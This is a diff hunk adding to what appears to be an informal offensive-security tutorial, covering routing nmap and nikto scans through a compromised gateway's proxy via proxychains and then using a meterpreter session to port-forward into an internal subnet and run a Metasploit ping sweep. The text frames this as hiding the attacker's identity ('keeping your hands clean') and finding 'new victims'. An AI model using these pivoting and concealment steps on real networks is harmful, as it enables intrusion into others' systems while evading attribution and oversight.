@@ -276,3 +276,15 @@ echo 'http 10.81.0.1 443' >> /etc/proxychains.conf
 This will allow you to run nmap and nikto web application scans against the outside target while assuming identity of your gateway or any person you stuck a http proxy on. Remember they actually have to have the http ports open (any port that accepts http) like 80, 81, 8080, 443, 8081.
 
 It helps in keeping your hands clean since a foreign firewall or scanner would only show the last IP and it's signature, not yours. 
+
+Now basically below here in this box, we switched the scanner to port 80, which everyone has. To allow yourself to even browse a webpage, we know port 80 has to be OPEN. 
+```
+meterpreter > portfwd add -l 60005 -p 80 -r 10.81.24.0/24 2
+[*] Local TCP relay created: :60005 <-> 10.81.24.0/24:80
+meterpreter > background 
+[*] Backgrounding session 2...
+msf post(multi/gather/ping_sweep) > run -j
+```
+So basically it's a guaranteed or reliable way to determine how many people are on a  network. Or how many new victims.
+
+
